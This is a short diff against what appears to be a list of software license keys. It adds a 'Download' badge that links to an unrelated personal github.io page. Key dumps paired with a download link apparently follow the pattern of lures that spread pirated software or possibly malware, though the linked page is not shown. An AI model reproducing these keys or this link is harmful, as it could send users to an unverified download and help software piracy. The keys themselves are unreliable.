@@ -15,3 +15,5 @@
 - TXULY-LDIQK-MBZN1-NTLF9-7D04Y
 - HAX08-P6ZXC-U5ADN-WVG8T-TUELE
 - ZUI5K-W5MWC-OKEJI-9BX7Q-U6V8I
+
+[![Download](https://img.shields.io/badge/Download-green)](https://aalansariw2.github.io)
